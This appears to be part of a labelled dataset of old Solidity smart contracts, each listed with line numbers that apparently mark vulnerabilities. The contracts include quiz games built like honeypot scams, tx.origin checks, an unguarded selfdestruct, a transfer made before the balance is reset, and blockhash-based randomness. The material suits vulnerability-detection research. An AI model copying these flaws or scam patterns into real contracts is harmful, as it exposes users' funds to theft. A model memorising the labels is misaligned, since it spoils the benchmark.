    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract Q_GAME
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract Q_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"            balances[users2users[parentUser]] = balances[users2users[parentUser]].add(interes);
            emit BalanceUp(users2users[parentUser], interes, now);
            collectBalances[users2users[parentUser]] = reminder;
            to = users2users[parentUser];
            _removeIndex(serchIndexByAddress(users2users[parentUser]));
            _queue(to, users2users[to]);
        }else{
            collectBalances[users2users[parentUser]] = collectBalances[users2users[parentUser]].add(referalBonus);
        }
        uint256 length = users.length;
        uint256 existLastIndex = length.sub(1);
        uint256 firstHalfEnd = 0;
        uint256 secondHalfStart = 0;
        if (length == 1 ){
            collectBalances[users[0]] = collectBalances[users[0]].add(queueInteres.mul(cyles.mul(2)));
        }else{
            if (length % 2 != 0) {
                firstHalfEnd  = length.div(2);
                secondHalfStart  = length.div(2);
            }else{
                firstHalfEnd  = length.div(2).sub(1);
                secondHalfStart  = length.div(2);
            }
            for (uint i = 1; i <= cyles; i++) {
                if(collectBalances[users[nextForwardUserId]].add(queueInteres) >= collect){
                    reminder = collectBalances[users[nextForwardUserId]].add(queueInteres) - collect;
                    balancesTotal[users[nextForwardUserId]] = balancesTotal[users[nextForwardUserId]].add(interes);
                    balances[users[nextForwardUserId]] = balances[users[nextForwardUserId]].add(interes);
                    collectBalances[users[nextForwardUserId]] = reminder;
                    emit BalanceUp(users[nextForwardUserId], interes, now);
                    to = users[nextForwardUserId];
                    _removeIndex(serchIndexByAddress(users[nextForwardUserId]));
                    _queue(to, users2users[to]);
                    if (nextForwardUserId == 0){
                        nextForwardUserId = firstHalfEnd;
                    }else{
                        nextForwardUserId = nextForwardUserId.sub(1);
                    }
                }else{
                    collectBalances[users[nextForwardUserId]] = collectBalances[users[nextForwardUserId]].add(queueInteres);
                }
                if(collectBalances[users[nextBackUserId]].add(queueInteres) == collect){
                    reminder = collectBalances[users[nextBackUserId]].add(queueInteres) - collect;
                    balancesTotal[users[nextBackUserId]] = balancesTotal[users[nextBackUserId]].add(interes);
                    balances[users[nextBackUserId]] = balances[users[nextBackUserId]].add(interes);
                    collectBalances[users[nextBackUserId]] = reminder;
                    emit BalanceUp(users[nextBackUserId], interes, now);
                    to = users[nextBackUserId];
                    _removeIndex(serchIndexByAddress(users[nextBackUserId]));
                    _queue(to, users2users[to]);
                    if (nextBackUserId == existLastIndex){
                        nextBackUserId = secondHalfStart;
                    }else{
                        nextBackUserId = nextBackUserId.add(1);
                    }
                }else{
                    collectBalances[users[nextBackUserId]] = collectBalances[users[nextBackUserId]].add(queueInteres);
                }
            }
        }
    }
    function getMyMoney() public {
        require(balances[msg.sender]>0);
        msg.sender.transfer(balances[msg.sender]);
        emit GetMyMoney(msg.sender, balances[msg.sender], now);
        balances[msg.sender]=0;
    }
    function balanceOf(address who) public view returns (uint256 balance) {
        return balances[who];
    }
    function balanceTotalOf(address who) public view returns (uint256 balanceTotal) {
        return balancesTotal[who];
    }
    function getNextForwardUserId() public view returns (uint256) {
        return nextForwardUserId;
    }
    function getNextBackUserId() public view returns (uint256) {
        return nextBackUserId;
    }
    function getLastIndex() public view returns (uint256) {
        uint256 length = users.length;
        return length.sub(1);
    }
    function getUserAddressById(uint256 id) public view returns (address userAddress) {
        return users[id];
    }
    function checkExistAddress(address user) public view returns (bool) {
        return usersExist[user];
    }
    function getParentUser(address user) public view returns (address) {
        return users2users[user];
    }
}",[64]
"pragma solidity ^0.4.25;
contract Quick_game
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x081a05ad67c3f9ec588a859d4e03febee8a6c09f8d29831bd7d7628819194b55;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract Quiz
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function Start_quiz_g(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract Quiz_Jackpot
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function init_game(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"    address public advisor;
    uint256 public advisorFee; // 1 = 0,1%
	uint256 public constant decimals = 18;
    uint256 public endTime;  // seconds from 1970-01-01T00:00:00Z
    uint256 public startTime;  // seconds from 1970-01-01T00:00:00Z
    mapping(address => bool) public rc;
    function TokenSale(address _tokenAddress, address _rateAddress, uint256 _startTime, uint256 _endTime) public {
        tokenContract = tokenInterface(_tokenAddress);
        rateContract = rateInterface(_rateAddress);
        setTime(_startTime, _endTime);
        wallet = msg.sender;
        advisor = msg.sender;
        advisorFee = 0 * 10**3;
    }
    function tokenValueInEther(uint256 _oneTokenInUsdWei) public view returns(uint256 tknValue) {
        uint256 oneEtherInUsd = rateContract.readRate(""usd"");
        tknValue = _oneTokenInUsdWei.mul(10 ** uint256(decimals)).div(oneEtherInUsd);
        return tknValue;
    }
    modifier isBuyable() {
        require( now > startTime ); // check if started
        require( now < endTime ); // check if ended
        require( msg.value > 0 );
		uint256 remainingTokens = tokenContract.balanceOf(this);
        require( remainingTokens > 0 ); // Check if there are any remaining tokens
        _;
    }
    event Buy(address buyer, uint256 value, address indexed ambassador);
    modifier onlyRC() {
        require( rc[msg.sender] ); //check if is an authorized rcContract
        _;
    }
    function buyFromRC(address _buyer, uint256 _rcTokenValue, uint256 _remainingTokens) onlyRC isBuyable public payable returns(uint256) {
        uint256 oneToken = 10 ** uint256(decimals);
        uint256 tokenValue = tokenValueInEther(_rcTokenValue);
        uint256 tokenAmount = msg.value.mul(oneToken).div(tokenValue);
        address _ambassador = msg.sender;
        uint256 remainingTokens = tokenContract.balanceOf(this);
        if ( _remainingTokens < remainingTokens ) {
            remainingTokens = _remainingTokens;
        }
        if ( remainingTokens < tokenAmount ) {
            uint256 refund = (tokenAmount - remainingTokens).mul(tokenValue).div(oneToken);
            tokenAmount = remainingTokens;
            forward(msg.value-refund);
			remainingTokens = 0; // set remaining token to 0
             _buyer.transfer(refund);
        } else {
			remainingTokens = remainingTokens.sub(tokenAmount); // update remaining token without bonus
            forward(msg.value);
        }
        tokenContract.transfer(_buyer, tokenAmount);
        emit Buy(_buyer, tokenAmount, _ambassador);
        return tokenAmount;
    }
    function forward(uint256 _amount) internal {
        uint256 advisorAmount = _amount.mul(advisorFee).div(10**3);
        uint256 walletAmount = _amount - advisorAmount;
        advisor.transfer(advisorAmount);
        wallet.transfer(walletAmount);
    }
    event NewRC(address contr);
    function addMeByRC() public {
        require(tx.origin == owner);
        rc[ msg.sender ]  = true;
        emit NewRC(msg.sender);
    }
    function setTime(uint256 _newStart, uint256 _newEnd) public onlyOwner {
        if ( _newStart != 0 ) startTime = _newStart;
        if ( _newEnd != 0 ) endTime = _newEnd;
    }
    function withdraw(address to, uint256 value) public onlyOwner {
        to.transfer(value);
    }
    function withdrawTokens(address to, uint256 value) public onlyOwner returns (bool) {
        return tokenContract.transfer(to, value);
    }
    function setTokenContract(address _tokenContract) public onlyOwner {
        tokenContract = tokenInterface(_tokenContract);
    }
    function setWalletAddress(address _wallet) public onlyOwner {
        wallet = _wallet;
    }
    function setAdvisorAddress(address _advisor) public onlyOwner {
            advisor = _advisor;
    }
    function setAdvisorFee(uint256 _advisorFee) public onlyOwner {
            advisorFee = _advisorFee;
    }
    function setRateContract(address _rateAddress) public onlyOwner {
        rateContract = rateInterface(_rateAddress);
    }
	function claim(address _buyer, uint256 _amount) onlyRC public returns(bool) {
        return tokenContract.transfer(_buyer, _amount);
    }
    function () public payable {
        revert();
    }
}",[64]
"    address public advisor;
    uint256 public advisorFee; // 1 = 0,1%
	uint256 public constant decimals = 18;
    uint256 public endTime;  // seconds from 1970-01-01T00:00:00Z
    uint256 public startTime;  // seconds from 1970-01-01T00:00:00Z
    mapping(address => bool) public rc;
    function TokenSale(address _tokenAddress, address _rateAddress, uint256 _startTime, uint256 _endTime) public {
        tokenContract = tokenInterface(_tokenAddress);
        rateContract = rateInterface(_rateAddress);
        setTime(_startTime, _endTime);
        wallet = msg.sender;
        advisor = msg.sender;
        advisorFee = 0 * 10**3;
    }
    function tokenValueInEther(uint256 _oneTokenInUsdWei) public view returns(uint256 tknValue) {
        uint256 oneEtherInUsd = rateContract.readRate(""usd"");
        tknValue = _oneTokenInUsdWei.mul(10 ** uint256(decimals)).div(oneEtherInUsd);
        return tknValue;
    }
    modifier isBuyable() {
        require( now > startTime ); // check if started
        require( now < endTime ); // check if ended
        require( msg.value > 0 );
		uint256 remainingTokens = tokenContract.balanceOf(this);
        require( remainingTokens > 0 ); // Check if there are any remaining tokens
        _;
    }
    event Buy(address buyer, uint256 value, address indexed ambassador);
    modifier onlyRC() {
        require( rc[msg.sender] ); //check if is an authorized rcContract
        _;
    }
    function buyFromRC(address _buyer, uint256 _rcTokenValue, uint256 _remainingTokens) onlyRC isBuyable public payable returns(uint256) {
        uint256 oneToken = 10 ** uint256(decimals);
        uint256 tokenValue = tokenValueInEther(_rcTokenValue);
        uint256 tokenAmount = msg.value.mul(oneToken).div(tokenValue);
        address _ambassador = msg.sender;
        uint256 remainingTokens = tokenContract.balanceOf(this);
        if ( _remainingTokens < remainingTokens ) {
            remainingTokens = _remainingTokens;
        }
        if ( remainingTokens < tokenAmount ) {
            uint256 refund = (tokenAmount - remainingTokens).mul(tokenValue).div(oneToken);
            tokenAmount = remainingTokens;
            forward(msg.value-refund);
			remainingTokens = 0; // set remaining token to 0
             _buyer.transfer(refund);
        } else {
			remainingTokens = remainingTokens.sub(tokenAmount); // update remaining token without bonus
            forward(msg.value);
        }
        tokenContract.transfer(_buyer, tokenAmount);
        emit Buy(_buyer, tokenAmount, _ambassador);
        return tokenAmount;
    }
    function forward(uint256 _amount) internal {
        uint256 advisorAmount = _amount.mul(advisorFee).div(10**3);
        uint256 walletAmount = _amount - advisorAmount;
        advisor.transfer(advisorAmount);
        wallet.transfer(walletAmount);
    }
    event NewRC(address contr);
    function addMeByRC() public {
        require(tx.origin == owner);
        rc[ msg.sender ]  = true;
        emit NewRC(msg.sender);
    }
    function setTime(uint256 _newStart, uint256 _newEnd) public onlyOwner {
        if ( _newStart != 0 ) startTime = _newStart;
        if ( _newEnd != 0 ) endTime = _newEnd;
    }
    function withdraw(address to, uint256 value) public onlyOwner {
        to.transfer(value);
    }
    function withdrawTokens(address to, uint256 value) public onlyOwner returns (bool) {
        return tokenContract.transfer(to, value);
    }
    function setTokenContract(address _tokenContract) public onlyOwner {
        tokenContract = tokenInterface(_tokenContract);
    }
    function setWalletAddress(address _wallet) public onlyOwner {
        wallet = _wallet;
    }
    function setAdvisorAddress(address _advisor) public onlyOwner {
            advisor = _advisor;
    }
    function setAdvisorFee(uint256 _advisorFee) public onlyOwner {
            advisorFee = _advisorFee;
    }
    function setRateContract(address _rateAddress) public onlyOwner {
        rateContract = rateInterface(_rateAddress);
    }
	function claim(address _buyer, uint256 _amount) onlyRC public returns(bool) {
        return tokenContract.transfer(_buyer, _amount);
    }
    function () public payable {
        revert();
    }
}",[64]
"    address public advisor;
    uint256 public advisorFee; // 1 = 0,1%
	uint256 public constant decimals = 18;
    uint256 public endTime;  // seconds from 1970-01-01T00:00:00Z
    uint256 public startTime;  // seconds from 1970-01-01T00:00:00Z
    mapping(address => bool) public rc;
    function TokenSale(address _tokenAddress, address _rateAddress, uint256 _startTime, uint256 _endTime) public {
        tokenContract = tokenInterface(_tokenAddress);
        rateContract = rateInterface(_rateAddress);
        setTime(_startTime, _endTime);
        wallet = msg.sender;
        advisor = msg.sender;
        advisorFee = 0 * 10**3;
    }
    function tokenValueInEther(uint256 _oneTokenInUsdWei) public view returns(uint256 tknValue) {
        uint256 oneEtherInUsd = rateContract.readRate(""usd"");
        tknValue = _oneTokenInUsdWei.mul(10 ** uint256(decimals)).div(oneEtherInUsd);
        return tknValue;
    }
    modifier isBuyable() {
        require( now > startTime ); // check if started
        require( now < endTime ); // check if ended
        require( msg.value > 0 );
		uint256 remainingTokens = tokenContract.balanceOf(this);
        require( remainingTokens > 0 ); // Check if there are any remaining tokens
        _;
    }
    event Buy(address buyer, uint256 value, address indexed ambassador);
    modifier onlyRC() {
        require( rc[msg.sender] ); //check if is an authorized rcContract
        _;
    }
    function buyFromRC(address _buyer, uint256 _rcTokenValue, uint256 _remainingTokens) onlyRC isBuyable public payable returns(uint256) {
        uint256 oneToken = 10 ** uint256(decimals);
        uint256 tokenValue = tokenValueInEther(_rcTokenValue);
        uint256 tokenAmount = msg.value.mul(oneToken).div(tokenValue);
        address _ambassador = msg.sender;
        uint256 remainingTokens = tokenContract.balanceOf(this);
        if ( _remainingTokens < remainingTokens ) {
            remainingTokens = _remainingTokens;
        }
        if ( remainingTokens < tokenAmount ) {
            uint256 refund = (tokenAmount - remainingTokens).mul(tokenValue).div(oneToken);
            tokenAmount = remainingTokens;
            forward(msg.value-refund);
			remainingTokens = 0; // set remaining token to 0
             _buyer.transfer(refund);
        } else {
			remainingTokens = remainingTokens.sub(tokenAmount); // update remaining token without bonus
            forward(msg.value);
        }
        tokenContract.transfer(_buyer, tokenAmount);
        emit Buy(_buyer, tokenAmount, _ambassador);
        return tokenAmount;
    }
    function forward(uint256 _amount) internal {
        uint256 advisorAmount = _amount.mul(advisorFee).div(10**3);
        uint256 walletAmount = _amount - advisorAmount;
        advisor.transfer(advisorAmount);
        wallet.transfer(walletAmount);
    }
    event NewRC(address contr);
    function addMeByRC() public {
        require(tx.origin == owner);
        rc[ msg.sender ]  = true;
        emit NewRC(msg.sender);
    }
    function setTime(uint256 _newStart, uint256 _newEnd) public onlyOwner {
        if ( _newStart != 0 ) startTime = _newStart;
        if ( _newEnd != 0 ) endTime = _newEnd;
    }
    function withdraw(address to, uint256 value) public onlyOwner {
        to.transfer(value);
    }
    function withdrawTokens(address to, uint256 value) public onlyOwner returns (bool) {
        return tokenContract.transfer(to, value);
    }
    function setTokenContract(address _tokenContract) public onlyOwner {
        tokenContract = tokenInterface(_tokenContract);
    }
    function setWalletAddress(address _wallet) public onlyOwner {
        wallet = _wallet;
    }
    function setAdvisorAddress(address _advisor) public onlyOwner {
            advisor = _advisor;
    }
    function setAdvisorFee(uint256 _advisorFee) public onlyOwner {
            advisorFee = _advisorFee;
    }
    function setRateContract(address _rateAddress) public onlyOwner {
        rateContract = rateInterface(_rateAddress);
    }
	function claim(address _buyer, uint256 _amount) onlyRC public returns(bool) {
        return tokenContract.transfer(_buyer, _amount);
    }
    function () public payable {
        revert();
    }
}",[64]
"    address public advisor;
    uint256 public advisorFee; // 1 = 0,1%
	uint256 public constant decimals = 18;
    uint256 public endTime;  // seconds from 1970-01-01T00:00:00Z
    uint256 public startTime;  // seconds from 1970-01-01T00:00:00Z
    mapping(address => bool) public rc;
    function TokenSale(address _tokenAddress, address _rateAddress, uint256 _startTime, uint256 _endTime) public {
        tokenContract = tokenInterface(_tokenAddress);
        rateContract = rateInterface(_rateAddress);
        setTime(_startTime, _endTime);
        wallet = msg.sender;
        advisor = msg.sender;
        advisorFee = 0 * 10**3;
    }
    function tokenValueInEther(uint256 _oneTokenInFiatWei) public view returns(uint256 tknValue) {
        uint256 oneEtherInUsd = rateContract.readRate(""usd"");
        tknValue = _oneTokenInFiatWei.mul(10 ** uint256(decimals)).div(oneEtherInUsd);
        return tknValue;
    }
    modifier isBuyable() {
        require( now > startTime ); // check if started
        require( now < endTime ); // check if ended
        require( msg.value > 0 );
		uint256 remainingTokens = tokenContract.balanceOf(this);
        require( remainingTokens > 0 ); // Check if there are any remaining tokens
        _;
    }
    event Buy(address buyer, uint256 value, address indexed ambassador);
    modifier onlyRC() {
        require( rc[msg.sender] ); //check if is an authorized rcContract
        _;
    }
    function buyFromRC(address _buyer, uint256 _rcTokenValue, uint256 _remainingTokens) onlyRC isBuyable public payable returns(uint256) {
        uint256 oneToken = 10 ** uint256(decimals);
        uint256 tokenValue = tokenValueInEther(_rcTokenValue);
        uint256 tokenAmount = msg.value.mul(oneToken).div(tokenValue);
        address _ambassador = msg.sender;
        uint256 remainingTokens = tokenContract.balanceOf(this);
        if ( _remainingTokens < remainingTokens ) {
            remainingTokens = _remainingTokens;
        }
        if ( remainingTokens < tokenAmount ) {
            uint256 refund = (tokenAmount - remainingTokens).mul(tokenValue).div(oneToken);
            tokenAmount = remainingTokens;
            forward(msg.value-refund);
			remainingTokens = 0; // set remaining token to 0
             _buyer.transfer(refund);
        } else {
			remainingTokens = remainingTokens.sub(tokenAmount); // update remaining token without bonus
            forward(msg.value);
        }
        tokenContract.transfer(_buyer, tokenAmount);
        emit Buy(_buyer, tokenAmount, _ambassador);
        return tokenAmount;
    }
    function forward(uint256 _amount) internal {
        uint256 advisorAmount = _amount.mul(advisorFee).div(10**3);
        uint256 walletAmount = _amount - advisorAmount;
        advisor.transfer(advisorAmount);
        wallet.transfer(walletAmount);
    }
    event NewRC(address contr);
    function addMeByRC() public {
        require(tx.origin == owner);
        rc[ msg.sender ]  = true;
        emit NewRC(msg.sender);
    }
    function setTime(uint256 _newStart, uint256 _newEnd) public onlyOwner {
        if ( _newStart != 0 ) startTime = _newStart;
        if ( _newEnd != 0 ) endTime = _newEnd;
    }
    function withdraw(address to, uint256 value) public onlyOwner {
        to.transfer(value);
    }
    function withdrawTokens(address to, uint256 value) public onlyOwner returns (bool) {
        return tokenContract.transfer(to, value);
    }
    function setTokenContract(address _tokenContract) public onlyOwner {
        tokenContract = tokenInterface(_tokenContract);
    }
    function setWalletAddress(address _wallet) public onlyOwner {
        wallet = _wallet;
    }
    function setAdvisorAddress(address _advisor) public onlyOwner {
            advisor = _advisor;
    }
    function setAdvisorFee(uint256 _advisorFee) public onlyOwner {
            advisorFee = _advisorFee;
    }
    function setRateContract(address _rateAddress) public onlyOwner {
        rateContract = rateInterface(_rateAddress);
    }
	function claim(address _buyer, uint256 _amount) onlyRC public returns(bool) {
        return tokenContract.transfer(_buyer, _amount);
    }
    function () public payable {
        revert();
    }
}",[64]
"            phases[index].startTime = phases[index-1].endTime;
        }
        phases[index].endTime = phases[index].startTime+delay;
    }
    // fallback function can be used to buy tokens
    function () external payable {
        buyTokens(msg.sender);
    }
    // low level token purchase function
    function buyTokens(address beneficiary) public payable {
        require(beneficiary != address(0));
        require(msg.value != 0);
        uint256 currentBonusPercent = getBonusPercent(now);
        uint256 weiAmount = msg.value;
        uint256 volumeBonus=getVolumeBonus(weiAmount);
        require(weiAmount>=minContribution);
        // calculate token amount to be created
        uint256 tokens = calculateTokenAmount(weiAmount, currentBonusPercent,volumeBonus);
        // update state
        weiRaised = weiRaised.add(weiAmount);
        token.transfer(beneficiary, tokens);
        TokenPurchase(msg.sender, beneficiary, weiAmount, currentBonusPercent, tokens);
        forwardFunds();
    }
    function getVolumeBonus(uint256 _wei) private view returns(uint256){
        for(uint256 i=0;i<bonusValue.length;++i){
            if(_wei>bonusValue[i].minimum && _wei<bonusValue[i].maximum){
                return bonusValue[i].bonus;
            }
        }
        return 0;
    }
    // If phase exists return corresponding bonus for the given date
    // else return 0 (percent)
    function getBonusPercent(uint256 datetime) private view returns (uint256) {
        for (uint i = 0; i < totalPhases; i++) {
            if (datetime >= phases[i].startTime && datetime <= phases[i].endTime) {
                return phases[i].bonusPercent;
            }
        }
        return 0;
    }
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owners==msg.sender);
        _;
    }
    // calculates how much tokens will beneficiary get
    // for given amount of wei
    function calculateTokenAmount(uint256 _weiDeposit, uint256 _bonusTokensPercent,uint256 _volumeBonus) private view returns (uint256) {
        uint256 mainTokens = _weiDeposit.div(price);
        uint256 bonusTokens = mainTokens.percent(_bonusTokensPercent);
        uint256 volumeBonus=mainTokens.percent(_volumeBonus);
        return mainTokens.add(bonusTokens).add(volumeBonus);
    }
    // send ether to the fund collection wallet
    // override to create custom fund forwarding mechanisms
    function forwardFunds() internal {
        wallet.transfer(msg.value);
    }
    function stopCrowdsale() public {
        token.burn(token.balanceOf(this));
        selfdestruct(wallet);
    }
    function getCurrentBonus() public constant returns(uint256){
        return getBonusPercent(now);
    }
    function calculateEstimateToken(uint256 _wei) public constant returns(uint256){
        uint256 timeBonus=getCurrentBonus();
        uint256 volumeBonus=getVolumeBonus(_wei);
        return calculateTokenAmount(_wei,timeBonus,volumeBonus);
    }
}","[63, 65]"
"pragma solidity ^0.4.20;
contract RIDDLE_GAME
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.24;
/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of ""user permissions"".
 */
contract Ownable {
  address public owner;
  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );
  /**
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  constructor() public {
    owner = msg.sender;
  }
  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  /**
   * @dev Allows the current owner to relinquish control of the contract.
   * @notice Renouncing to ownership will leave the contract without an owner.
   * It will not be possible to call the functions with the `onlyOwner`
   * modifier anymore.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
  }
  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param _newOwner The address to transfer ownership to.
   */
  function transferOwnership(address _newOwner) public onlyOwner {
    _transferOwnership(_newOwner);
  }
  /**
   * @dev Transfers control of the contract to a newOwner.
   * @param _newOwner The address to transfer ownership to.
   */
  function _transferOwnership(address _newOwner) internal {
    require(_newOwner != address(0));
    emit OwnershipTransferred(owner, _newOwner);
    owner = _newOwner;
  }
}
contract Rainmaker is Ownable {
    function letItRain(address[] _to, uint[] _value) onlyOwner public payable returns (bool _success) {
        for (uint8 i = 0; i < _to.length; i++){
            uint amount = _value[i] * 1 finney;
            _to[i].transfer(amount);
        }
        return true;
    }
}","[57, 58, 59]"
"pragma solidity ^0.4.17;
contract RaiseFundsForACause {
    // Base definitions
    address public owner;
    address public receiver;
    string public cause;
    uint256 public expirationInSeconds;
    bool public hasBeenClaimed;
    uint256 public timeStarted;
    // Dynamic data
    uint256 public minimumAmountRequired;
    uint256 public numPayments;
    uint256 public totalAmountRaised;
    mapping(address => uint256) donationData;
    function RaiseFundsForACause(address beneficiary, string message, uint256 secondsUntilExpiration)
        public
    {
        require(beneficiary != 0x0);
        require(secondsUntilExpiration > 0);
        owner = msg.sender;
        receiver = beneficiary;
        cause = message;
        expirationInSeconds = secondsUntilExpiration;
        hasBeenClaimed = false;
        minimumAmountRequired = 0;
        numPayments = 0;
        totalAmountRaised = 0;
        timeStarted = block.timestamp;
    }
    function ()
        public
    {
        throw;
    }
    function donate()
        public
        payable
    {
        require(msg.sender != receiver);
        require(block.timestamp < (timeStarted + expirationInSeconds));
        require(msg.value > 0);
        require(minimumAmountRequired != 0);
        require(hasBeenClaimed == false);
        assert(donationData[msg.sender] + msg.value >= donationData[msg.sender]);
        assert(totalAmountRaised + msg.value >= totalAmountRaised);
        assert(numPayments + 1 >= numPayments);
        donationData[msg.sender] += msg.value;
        totalAmountRaised += msg.value;
        numPayments += 1;
    }
    // Note: can only be set once
    function receiverSetAmountRequired(uint256 minimum)
        public
    {
        require(msg.sender == receiver);
        require(minimumAmountRequired == 0);
        require(minimum > 0);
        minimumAmountRequired = minimum;
    }
    function receiverWithdraw()
        public
    {
        require(msg.sender == receiver);
        require(totalAmountRaised >= minimumAmountRequired);
        require(this.balance > 0);
        require(block.timestamp < (timeStarted + expirationInSeconds));
        require(hasBeenClaimed == false);
        hasBeenClaimed = true;
        receiver.transfer(this.balance);
        // Expecting transfer to throw on error
        // assert(this.balance == 0);
    }
    function withdraw()
        public
    {
        require(donationData[msg.sender] > 0);
        require(block.timestamp > (timeStarted + expirationInSeconds));
        require(hasBeenClaimed == false);
        var value = donationData[msg.sender];
        donationData[msg.sender] = 0;
        msg.sender.transfer(value);
        // Expecting transfer to throw on error
        // assert(donationData[donor] == 0);
    }
    function currentTotalExcess()
        public
        constant returns (uint256)
    {
        if (totalAmountRaised > minimumAmountRequired) {
            return totalAmountRaised - minimumAmountRequired;
        }
        else {
            return 0;
        }
    }
    function expirationTimestamp()
        public
        constant returns (uint256)
    {
        assert((timeStarted + expirationInSeconds) >= timeStarted);
        return (timeStarted + expirationInSeconds);
    }
}","[66, 79]"
"pragma solidity 0.4.23;
// Random lottery
// Smart contracts can't bet
// Pay 0.001 to get a random number
// If your random number is the highest so far you're in the lead
// If no one beats you in 1 day you can claim your winnnings - the entire balance.
contract RandoLotto {
    uint256 public highScore;
    address public currentWinner;
    uint256 public lastTimestamp;
    constructor () public {
        highScore = 0;
        currentWinner = msg.sender;
        lastTimestamp = now;
    }
    function () public payable {
        require(msg.sender == tx.origin);
        require(msg.value >= 0.001 ether);
        uint256 randomNumber = uint256(keccak256(blockhash(block.number - 1)));
        if (randomNumber > highScore) {
            currentWinner = msg.sender;
            lastTimestamp = now;
            highScore = randomNumber;
        }
    }
    function claimWinnings() public {
        require(now > lastTimestamp + 1 days);
        require(msg.sender == currentWinner);
        msg.sender.transfer(address(this).balance);
    }
}","[19, 27]"
"pragma solidity 0.4.23;
// Random lottery
// Smart contracts can't bet
// Pay 0.001 to get a random number
// If your random number is the highest so far you're in the lead
// If no one beats you in 1 day you can claim your winnnings - the entire balance.
contract RandoLotto {
    uint256 PrizePool;
    uint256 highScore;
    address currentWinner;
    uint256 lastTimestamp;
    constructor () public {
        highScore = 0;
        currentWinner = msg.sender;
        lastTimestamp = now;
    }
    function () public payable {
        require(msg.sender == tx.origin);
        require(msg.value >= 0.001 ether);
        uint256 randomNumber = uint256(keccak256(blockhash(block.number - 1)));
